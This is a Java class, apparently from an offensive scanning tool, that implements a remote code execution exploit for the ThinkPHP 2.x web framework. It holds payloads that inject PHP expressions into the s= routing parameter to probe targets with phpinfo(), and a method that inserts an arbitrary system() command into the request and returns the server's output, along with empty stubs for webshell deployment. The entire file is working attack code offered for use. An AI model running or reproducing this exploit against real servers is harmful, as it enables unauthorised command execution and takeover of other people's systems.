package com.guitool.tpbomb.payload;

import com.guitool.tpbomb.util.ResultUtils;
import com.guitool.tpbomb.util.UrlUtils;
import org.apache.commons.lang3.StringUtils;

import java.util.ArrayList;

public class TP2Rce implements PayloadTemplate {
    final ArrayList<String> payloadList = new ArrayList<>(){{
        add("?s=index/index/vuln/${@phpinfo()}");
        add("?s=index/\\think\\module/xxx/${@phpinfo()}");
    }};

    @Override
    public ResultUtils checkVulnerability(String url) {
        try {
            for (String payload : payloadList) {
                String result = UrlUtils.doGetSpecial(url + payload);
                if (result == null) {
                    continue;
                }
                if (result.contains("PHP Version")) {
                    return new ResultUtils(true, "ThinkPHP2.x RCE", url + payload);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return new ResultUtils(false, "ThinkPHP2.x RCE", "");
    }

    @Override
    public ResultUtils executeVulnerability(String url, String command) {
        String attackUrl = url + "?s=index/index/xxx/${${system(" + command + ")}}";
        try {
            String output;
            String result = UrlUtils.doGetSpecial(attackUrl);
            assert result != null;
            if (!result.contains("Parse error")) {
                output = StringUtils.substringBefore(result, "<!DOCTYPE");
                return new ResultUtils(true, "", output);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return new ResultUtils(false, "", "");
    }

    @Override
    public ResultUtils getBehinderShell(String url) {
        return null;
    }

    @Override
    public ResultUtils getAntswordShell(String url) {
        return null;
    }

}
